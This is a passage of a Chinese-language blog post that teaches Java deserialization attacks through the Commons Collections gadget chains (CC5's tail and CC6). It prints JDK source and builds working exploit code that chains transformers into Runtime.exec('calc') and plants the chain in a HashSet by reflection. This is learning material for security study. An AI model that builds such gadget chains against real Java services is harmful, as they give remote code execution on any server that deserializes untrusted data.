+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="comment">//ConstantTransformer对象负责把String类型换成Runtime.class</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">        &#125;;</span><br><span class="line">        <span class="comment">//new 一个ChainedTransformer对象传递一个Transformer[]数组循环调用对象的transform方法</span></span><br><span class="line">        Transformer chainedTransformer = (Transformer) <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line">        <span class="comment">//decorate还需要一个Map类型，所以new一个HashMap,因为map.containsKey(key)会判断是否包含指定的键，所以我们传一个空的map就行，让他走到factory.transform(key);</span></span><br><span class="line">        Map&lt;Integer,Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">        <span class="comment">//调用decorate静态方法构造LazyMap对象，它返回Map类型。</span></span><br><span class="line">        Map&lt;Object,Object&gt; r =  LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">        TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(r, r);</span><br><span class="line">        BadAttributeValueExpException val = <span class="keyword">new</span> BadAttributeValueExpException(<span class="keyword">null</span>);</span><br><span class="line">        Field valfield = val.getClass().getDeclaredField(<span class="string">&quot;val&quot;</span>);</span><br><span class="line">        valfield.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">        valfield.set(val,tiedMapEntry);</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20220106214927006.png" alt="image-20220106214927006"></p>
+<h2 id="CommonsCollections6"><a href="#CommonsCollections6" class="headerlink" title="CommonsCollections6"></a>CommonsCollections6</h2><p><strong>ysoserial Gadget chain：</strong></p>
+<figure class="highlight plaintext"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line">Gadget chain:</span><br><span class="line">	java.io.ObjectInputStream.readObject()</span><br><span class="line">		HashSet.readObject()</span><br><span class="line">			HashMap.put()</span><br><span class="line">			HashMap.hash()</span><br><span class="line">				TiedMapEntry.hashCode()</span><br><span class="line">				TiedMapEntry.getValue()</span><br><span class="line">					LazyMap.get()</span><br><span class="line">						ChainedTransformer.transform()</span><br><span class="line">							ConstantTransformer.transform()</span><br><span class="line">							InvokerTransformer.transform()</span><br></pre></td></tr></table></figure>
+
+<p>CC6的HashMap.hash调用了hashCode方法，这个在URLDNS中有介绍到，这里就不赘述了。我们直接看HashMap.put()。</p>
+<h3 id="HashMap-put"><a href="#HashMap-put" class="headerlink" title="HashMap.put()"></a>HashMap.put()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">static</span> <span class="keyword">final</span> <span class="keyword">int</span> <span class="title">hash</span><span class="params">(Object key)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">int</span> h;</span><br><span class="line">        <span class="keyword">return</span> (key == <span class="keyword">null</span>) ? <span class="number">0</span> : (h = key.hashCode()) ^ (h &gt;&gt;&gt; <span class="number">16</span>);</span><br><span class="line">&#125;</span><br><span class="line"></span><br><span class="line"><span class="function"><span class="keyword">public</span> V <span class="title">put</span><span class="params">(K key, V value)</span> </span>&#123;</span><br><span class="line">        <span class="keyword">return</span> putVal(hash(key), key, value, <span class="keyword">false</span>, <span class="keyword">true</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>put方法中调用了hash方法，传递一个key对象，那我们只需要把TiedMapEntry对象传递到key中，当调用hash方法就会就会返回TiedMapEntry.hashCode()</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="comment">//ConstantTransformer对象负责把String类型换成Runtime.class</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//new 一个ChainedTransformer对象传递一个Transformer[]数组循环调用对象的transform方法</span></span><br><span class="line">Transformer chainedTransformer = (Transformer) <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"><span class="comment">//decorate还需要一个Map类型，所以new一个HashMap,因为map.containsKey(key)会判断是否包含指定的键，所以我们传一个空的map就行，让他走到factory.transform(key);</span></span><br><span class="line">Map&lt;Integer,Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"><span class="comment">//调用decorate静态方法构造LazyMap对象，它返回Map类型。</span></span><br><span class="line">Map&lt;Object,Object&gt; r =  LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(r, r);</span><br><span class="line">Map&lt;TiedMapEntry,Integer&gt; map2 = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">map2.put(tiedMapEntry,<span class="number">1</span>);</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20220107123408957.png" alt="image-20220107123408957"></p>
+<h3 id="HashSet-readObject"><a href="#HashSet-readObject" class="headerlink" title="HashSet.readObject()"></a>HashSet.readObject()</h3><figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br></pre></td><td class="code"><pre><span class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">readObject</span><span class="params">(java.io.ObjectInputStream s)</span></span></span><br><span class="line"><span class="function">    <span class="keyword">throws</span> java.io.IOException, ClassNotFoundException </span>&#123;</span><br><span class="line">    <span class="comment">// Read in any hidden serialization magic</span></span><br><span class="line">    s.defaultReadObject();</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read capacity and verify non-negative.</span></span><br><span class="line">    <span class="keyword">int</span> capacity = s.readInt();</span><br><span class="line">    <span class="keyword">if</span> (capacity &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Illegal capacity: &quot;</span> +</span><br><span class="line">                                         capacity);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read load factor and verify positive and non NaN.</span></span><br><span class="line">    <span class="keyword">float</span> loadFactor = s.readFloat();</span><br><span class="line">    <span class="keyword">if</span> (loadFactor &lt;= <span class="number">0</span> || Float.isNaN(loadFactor)) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Illegal load factor: &quot;</span> +</span><br><span class="line">                                         loadFactor);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read size and verify non-negative.</span></span><br><span class="line">    <span class="keyword">int</span> size = s.readInt();</span><br><span class="line">    <span class="keyword">if</span> (size &lt; <span class="number">0</span>) &#123;</span><br><span class="line">        <span class="keyword">throw</span> <span class="keyword">new</span> InvalidObjectException(<span class="string">&quot;Illegal size: &quot;</span> +</span><br><span class="line">                                         size);</span><br><span class="line">    &#125;</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Set the capacity according to the size and load factor ensuring that</span></span><br><span class="line">    <span class="comment">// the HashMap is at least 25% full but clamping to maximum capacity.</span></span><br><span class="line">    capacity = (<span class="keyword">int</span>) Math.min(size * Math.min(<span class="number">1</span> / loadFactor, <span class="number">4.0f</span>),</span><br><span class="line">            HashMap.MAXIMUM_CAPACITY);</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Create backing HashMap</span></span><br><span class="line">    map = (((HashSet&lt;?&gt;)<span class="keyword">this</span>) <span class="keyword">instanceof</span> LinkedHashSet ?</span><br><span class="line">           <span class="keyword">new</span> LinkedHashMap&lt;E,Object&gt;(capacity, loadFactor) :</span><br><span class="line">           <span class="keyword">new</span> HashMap&lt;E,Object&gt;(capacity, loadFactor));</span><br><span class="line"></span><br><span class="line">    <span class="comment">// Read in all elements in the proper order.</span></span><br><span class="line">    <span class="keyword">for</span> (<span class="keyword">int</span> i=<span class="number">0</span>; i&lt;size; i++) &#123;</span><br><span class="line">        <span class="meta">@SuppressWarnings(&quot;unchecked&quot;)</span></span><br><span class="line">            E e = (E) s.readObject();</span><br><span class="line">        map.put(e, PRESENT);</span><br><span class="line">    &#125;</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure>
+
+<p>在HashSet.readObject方法中，跟进put()方法，进入java.util.HashMap中调用put()方法，接着调用hash()方法，进而调用key.hashCode()，这里只需要让key为TiedMapEntry对象即可。这里通过反射获取HashSet的class对象的map属性，然后通过get方法获取hashSet对象上map字段的值。再反射获取HashMap的class对象的table属性，然后通过get方法获取innImpl对象上table字段的值。table字段的值是Node&lt;K,V&gt;对象，这里我并不知道Node&lt;K,V&gt;对象是什么，只知道他是HashMap的内部类，之后获取Node&lt;K,V&gt;类的class对象并且获取key属性，将tiedMapEntry对象set给key属性，讲道理这里我并不是很理解，我只知道ysoserial工具是这样操作的。</p>
+<figure class="highlight java"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br></pre></td><td class="code"><pre><span class="line">Transformer[] transformers = <span class="keyword">new</span> Transformer[]&#123;</span><br><span class="line">                <span class="comment">//ConstantTransformer对象负责把String类型换成Runtime.class</span></span><br><span class="line">                <span class="keyword">new</span> ConstantTransformer(Runtime.class),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;getMethod&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class,Class[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;getRuntime&quot;</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;invoke&quot;</span>,<span class="keyword">new</span> Class[]&#123;Object.class,Object[].class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="keyword">null</span>,<span class="keyword">null</span>&#125;),</span><br><span class="line">                <span class="keyword">new</span> InvokerTransformer(<span class="string">&quot;exec&quot;</span>,<span class="keyword">new</span> Class[]&#123;String.class&#125;,<span class="keyword">new</span> Object[]&#123;<span class="string">&quot;calc&quot;</span>&#125;)</span><br><span class="line">&#125;;</span><br><span class="line"><span class="comment">//new 一个ChainedTransformer对象传递一个Transformer[]数组循环调用对象的transform方法</span></span><br><span class="line">Transformer chainedTransformer = (Transformer) <span class="keyword">new</span> ChainedTransformer(transformers);</span><br><span class="line"><span class="comment">//decorate还需要一个Map类型，所以new一个HashMap,因为map.containsKey(key)会判断是否包含指定的键，所以我们传一个空的map就行，让他走到factory.transform(key);</span></span><br><span class="line">Map&lt;Integer,Integer&gt; map = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line"><span class="comment">//调用decorate静态方法构造LazyMap对象，它返回Map类型。</span></span><br><span class="line">Map&lt;Object,Object&gt; r =  LazyMap.decorate(map,chainedTransformer);</span><br><span class="line">TiedMapEntry tiedMapEntry = <span class="keyword">new</span> TiedMapEntry(r, r);</span><br><span class="line">Map&lt;TiedMapEntry,Integer&gt; map2 = <span class="keyword">new</span> HashMap&lt;&gt;();</span><br><span class="line">HashSet hashSet = <span class="keyword">new</span> HashSet(<span class="number">1</span>);</span><br><span class="line">hashSet.add(<span class="string">&quot;foo&quot;</span>);</span><br><span class="line">Field f = HashSet.class.getDeclaredField(<span class="string">&quot;map&quot;</span>);</span><br><span class="line">f.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">HashMap innImpl = (HashMap) f.get(hashSet);</span><br><span class="line">Field f2 = HashMap.class.getDeclaredField(<span class="string">&quot;table&quot;</span>);</span><br><span class="line">f2.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">Object[] array = (Object[]) f2.get(innImpl);</span><br><span class="line">Object node = array[<span class="number">0</span>];</span><br><span class="line"><span class="keyword">if</span>(node == <span class="keyword">null</span>)&#123;</span><br><span class="line">	node = array[<span class="number">1</span>];</span><br><span class="line">&#125;</span><br><span class="line">Field keyField = node.getClass().getDeclaredField(<span class="string">&quot;key&quot;</span>);</span><br><span class="line">keyField.setAccessible(<span class="keyword">true</span>);</span><br><span class="line">keyField.set(node,tiedMapEntry);</span><br></pre></td></tr></table></figure>
+
+<p><img src="image-20220107150916256.png" alt="image-20220107150916256"></p>
+
+            
+
+
+        </div>
+    </div>
+    <div id="post-footer" class="post-footer main-content-wrap">
+        
+            <div class="post-footer-tags">
+                <span class="text-color-light text-small">标签</span><br/>
+                
+    <a class="tag tag--primary tag--small t-none-link" href="/tags/java%E5%AE%89%E5%85%A8/" rel="tag">java安全</a> <a class="tag tag--primary tag--small t-none-link" href="/tags/%E5%8F%8D%E5%BA%8F%E5%88%97%E5%8C%96/" rel="tag">反序列化</a>
+
+            </div>
+        
+        
+            <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    <a
+                        class="post-action-btn btn btn--disabled"
+                        aria-hidden="true"
+                    >
+                        
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2022/01/02/20220102/"
+                    data-tooltip="java反序列化Commons Collections(三)"
+                    aria-label="下一篇: java反序列化Commons Collections(三)"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Diesen Beitrag teilen"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=https://self209.github.io/2022/01/02/20220102-1/"
+                    title="分享到 Twitter"
+                    aria-label="分享到 Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=https://self209.github.io/2022/01/02/20220102-1/"
+                    title="分享到 Google+"
+                    aria-label="分享到 Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=https://self209.github.io/2022/01/02/20220102-1/&amp;title=java反序列化Commons Collections(四)"
+                    title="分享到 QQ"
+                    aria-label="分享到 QQ"
+                >
+                    <i class="fab fa-qq" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="目录">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+        
+        
+    </div>
+</article>
+
+
+
+                <footer id="footer" class="main-content-wrap">
+    <span class="copyrights">
+        Copyrights &copy; 2022 self_209. All Rights Reserved.
+    </span>
+</footer>
+
+            </div>
+            
+                <div id="bottom-bar" class="post-bottom-bar" data-behavior="5">
+                    <div class="post-actions-wrap">
+    <nav>
+        <ul class="post-actions post-action-nav">
+            <li class="post-action">
+                
+                    <a
+                        class="post-action-btn btn btn--disabled"
+                        aria-hidden="true"
+                    >
+                        
+                        <i class="fa fa-angle-left" aria-hidden="true"></i>
+                        <span class="hide-xs hide-sm text-small icon-ml">上一篇</span>
+                    </a>
+            </li>
+            <li class="post-action">
+                
+                    
+                <a
+                    class="post-action-btn btn btn--default tooltip--top"
+                    href="/2022/01/02/20220102/"
+                    data-tooltip="java反序列化Commons Collections(三)"
+                    aria-label="下一篇: java反序列化Commons Collections(三)"
+                >
+                    
+                        <span class="hide-xs hide-sm text-small icon-mr">下一篇</span>
+                        <i class="fa fa-angle-right" aria-hidden="true"></i>
+                    </a>
+            </li>
+        </ul>
+    </nav>
+    <ul class="post-actions post-action-share">
+        <li class="post-action hide-lg hide-md hide-sm">
+            <a
+                class="post-action-btn btn btn--default btn-open-shareoptions"
+                href="#btn-open-shareoptions"
+                aria-label="Diesen Beitrag teilen"
+            >
+                <i class="fa fa-share-alt" aria-hidden="true"></i>
+            </a>
+        </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://twitter.com/intent/tweet?text=https://self209.github.io/2022/01/02/20220102-1/"
+                    title="分享到 Twitter"
+                    aria-label="分享到 Twitter"
+                >
+                    <i class="fab fa-twitter" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="https://plus.google.com/share?url=https://self209.github.io/2022/01/02/20220102-1/"
+                    title="分享到 Google+"
+                    aria-label="分享到 Google+"
+                >
+                    <i class="fab fa-google-plus" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+            
+            
+            <li class="post-action hide-xs">
+                <a
+                    class="post-action-btn btn btn--default"
+                    target="new" href="http://connect.qq.com/widget/shareqq/index.html?url=https://self209.github.io/2022/01/02/20220102-1/&amp;title=java反序列化Commons Collections(四)"
+                    title="分享到 QQ"
+                    aria-label="分享到 QQ"
+                >
+                    <i class="fab fa-qq" aria-hidden="true"></i>
+                </a>
+            </li>
+        
+        
+        <li class="post-action">
+            
+                <a class="post-action-btn btn btn--default" href="#table-of-contents" aria-label="目录">
+            
+                <i class="fa fa-list" aria-hidden="true"></i>
+            </a>
+        </li>
+    </ul>
+</div>
+
+
+                </div>
+                
+    <div id="share-options-bar" class="share-options-bar" data-behavior="5">
+        <i id="btn-close-shareoptions" class="fa fa-times"></i>
+        <ul class="share-options">
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://twitter.com/intent/tweet?text=https://self209.github.io/2022/01/02/20220102-1/"
+                        aria-label="分享到 Twitter"
+                    >
+                        <i class="fab fa-twitter" aria-hidden="true"></i><span>分享到 Twitter</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="https://plus.google.com/share?url=https://self209.github.io/2022/01/02/20220102-1/"
+                        aria-label="分享到 Google+"
+                    >
+                        <i class="fab fa-google-plus" aria-hidden="true"></i><span>分享到 Google+</span>
+                    </a>
+                </li>
+            
+                
+                
+                <li class="share-option">
+                    <a
+                        class="share-option-btn"
+                        target="new"
+                        href="http://connect.qq.com/widget/shareqq/index.html?url=https://self209.github.io/2022/01/02/20220102-1/&amp;title=java反序列化Commons Collections(四)"
+                        aria-label="分享到 QQ"
+                    >
+                        <i class="fab fa-qq" aria-hidden="true"></i><span>分享到 QQ</span>
+                    </a>
+                </li>
+            
+        </ul>
+    </div>
+
+
+            
+        </div>
+        
+
+
+<div id="about">
+    <div id="about-card">
+        <div id="about-btn-close">
+            <i class="fa fa-times"></i>
+        </div>
+        
+            <h4 id="about-card-name">self_209</h4>
+        
+            <div id="about-card-bio"><p>author.bio</p>
+</div>
+        
+        
+            <div id="about-card-job">
+                <i class="fa fa-briefcase"></i>
+                <br/>
+                <p>author.job</p>
+
+            </div>
+        
+        
+    </div>
+</div>
+
+        
+        
+<div id="cover" style="background-image:url('/assets/images/cover.jpg');"></div>
+        <!--SCRIPTS-->
+
+<script src="/assets/js/script-xim376viwh5lr12gw0yeibdthi5jv6dbtso7hirh0xa2nvwxpntwvib0dgwh.min.js"></script>
+
+<!--SCRIPTS END-->
+
+
+
+
+
+    </body>
+</html>
